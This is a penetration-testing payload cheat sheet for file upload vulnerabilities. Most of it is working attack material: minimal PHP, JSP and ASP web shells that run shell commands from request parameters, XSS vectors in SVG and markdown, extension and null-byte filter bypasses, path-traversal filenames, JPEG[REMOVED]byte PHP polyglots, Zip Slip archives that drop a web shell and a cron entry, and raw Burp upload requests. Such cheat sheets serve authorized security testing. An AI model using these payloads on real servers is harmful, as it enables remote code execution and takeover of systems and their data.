# File Upload Vulnerabilities - Payloads

This document provides annotated payloads and techniques for testing file upload vulnerabilities. Use responsibly in authorized environments only.

## Legend
- [!] High effectiveness
- [*] May require server-specific conditions
- CT: Content-Type header to set
- Note: Important usage notes or requirements

---

## 1) Unrestricted File Upload (baseline probes)

### 1.1 Benign probes to map validation
- filename: test.txt
  - CT: text/plain
  - Note: Establishes baseline acceptance.
- filename: test.jpg
  - CT: image/jpeg
  - Note: Confirms image-accepting paths.
- filename: test.css, test.svg
  - CT: text/css, image/svg+xml
  - Note: SVG can contain script (see XSS vectors below).

### 1.2 Dangerous but common-script extensions
- filename: probe.php [!]
  - CT: application/x-php or text/plain
  - body:
    <?php echo "OK"; ?>
  - Note: If stored in webroot and executable, visiting URL should render OK.

- filename: probe.phtml / probe.php5 / probe.php3 [!]
  - CT: application/x-php
  - Note: Alternative PHP extensions often overlooked by filters.

- filename: probe.jsp / probe.jspf [!]
  - body:
    <% out.println("OK"); %>
  - Note: For Java stacks; requires deployment under JSP-capable paths.

- filename: probe.asp / probe.aspx [!]
  - body (ASP):
    <% Response.Write("OK") %>
  - Note: For IIS/.NET stacks.

### 1.3 Polyglot/SVG script vectors
- filename: image.svg [*]
  - CT: image/svg+xml
  - body:
    <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
  - Note: Stored XSS if rendered inline; many apps treat SVG as image.

- filename: readme.md [*]
  - CT: text/markdown
  - body:
    <img src=x onerror=alert(1)>
  - Note: Depends on renderer; can trigger if HTML not sanitized.

---

## 2) Remote Code Execution (RCE) via upload

### 2.1 Minimal web shells (PHP)
- filename: shell.php [!]
  - CT: application/x-php
  - body:
    <?php system($_GET['c']); ?>
  - Usage: /uploads/shell.php?c=id

- filename: eval.php [!]
  - body:
    <?php @assert($_POST['x']); ?>
  - Usage: POST x=system('id');

- filename: passthru.php [*]
  - body:
    <?php passthru($_REQUEST['c']); ?>

### 2.2 Web shells (JSP/ASP)
- filename: cmd.jsp [!]
  - body:
    <%@ page import="java.io.*" %>
    <%
      String c = request.getParameter("c");
      String s=null; if(c!=null){
        Process p = Runtime.getRuntime().exec(c);
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String l; while((l=r.readLine())!=null){ out.println(l+"<br>"); }
      }
    %>

- filename: cmd.asp [*]
  - body:
    <%
      Set o=Server.CreateObject("WScript.Shell")
      Set e=o.Exec(Request("c"))
      Response.Write(e.StdOut.ReadAll)
    %>

### 2.3 Deserialization/probing payloads
- filename: probe.phar [*]
  - CT: application/octet-stream
  - Note: If app unserializes uploaded content, may trigger gadget chains.

---

## 3) Extension/Name-based bypass techniques

### 3.1 Double extensions
- filename: avatar.php.jpg [!]
  - CT: image/jpeg
  - Note: Some servers honor first or last extension; depends on config.

- filename: resume.jpg.php [*]
  - CT: image/jpeg or application/x-php
  - Note: Some filters only check first extension.

### 3.2 Case toggling and unicode tricks
- filename: shEll.PhP [*]
  - Note: Case-insensitive environments may allow execution.

- filename: shell.php%20 [*]
  - Note: Trailing space/encoded whitespace can bypass naive checks.

- filename: shell.pHp%00.jpg [!]
  - Note: Legacy null-byte truncation on some stacks/filesystems.

- filename: shell.p.phphp [*]
  - Note: Regex bypass of ".php" detection like "/\.php$/".

### 3.3 Alternate executable extensions
- filename: shell.phtml, shell.phar, shell.inc [*]
- filename: shell.cgi, shell.pl [*]
- filename: web.config (IIS) [*] — can re-map handlers in some misconfigs.

### 3.4 Path traversal in filename
- filename: ../../../../tmp/shell.php [!]
  - Note: If server concatenates path without normalization, can escape directory.

- filename: ..\..\..\..\inetpub\wwwroot\shell.aspx [*]
  - Note: Windows traversal variant.

---

## 4) Content-Type and magic-byte bypasses

### 4.1 Spoofed Content-Type
- CT: image/jpeg with PHP body [!]
  - body:
    <?php echo 1; ?>
  - Note: Server trusting header will pass; downstream execution depends on storage/handler.

### 4.2 Magic bytes prepended
- filename: photo.jpg
  - body:
    \xFF\xD8\xFF\xE0JFIF<?php system($_GET['c']); ?>
  - Note: Magic bytes for JPEG to satisfy file signature checks.

### 4.3 Polyglot ZIP+PHP
- filename: payload.php
  - body: ZIP header + valid PHP tail
  - Note: Some validators read only first bytes; webserver may execute PHP.

---

## 5) Archive extraction (Zip Slip) payloads

- filename: evil.zip [!]
  - entries:
    ../../../../var/www/html/shell.php  (content: PHP web shell)
    ../../../../etc/cron.d/z  (content: cron entry)
  - Note: Targets vulnerable unzip routines without path normalization.

- filename: bomb.zip [*]
  - Note: Use classic zip bomb to test DoS protections.

---

## 6) Validation edge cases to probe

- Extremely long filenames (>= 255 chars)
- Non-ASCII unicode filenames (RTL overrides e.g., "evilgpj\u202Ephp")
- Duplicate filenames (overwrite checks)
- Zero-byte files
- Large files > max size (boundary handling)
- MIME boundary tampering in multipart forms

---

## 7) Burp Repeater examples

### Example 1: PHP body with image CT
POST /upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----ABCD

------ABCD
Content-Disposition: form-data; name="file"; filename="avatar.php.jpg"
Content-Type: image/jpeg

<?php echo "OK"; ?>
------ABCD--

### Example 2: Magic bytes JPEG+PHP
------ABCD
Content-Disposition: form-data; name="file"; filename="photo.jpg"
Content-Type: image/jpeg

\xFF\xD8\xFF\xE0JFIF<?php system($_GET['c']); ?>
------ABCD--

### Example 3: Traversal in filename
------ABCD
Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/shell.php"
Content-Type: application/octet-stream

<?php system($_GET['c']); ?>
------ABCD--

---

## 8) Notes on environments
- PHP + Apache: .php/.phtml often executable; Check .htaccess overrides.
- Nginx + PHP-FPM: Execution depends on location blocks and try_files.
- IIS: web.config can re-map; .asp/.aspx handlers.
- Tomcat/Java: JSP execution requires deployment paths.

## 9) Ethics and scope
Use only in authorized tests. Avoid destructive commands. Prefer non-destructive "id", "whoami", or echo probes to confirm execution.
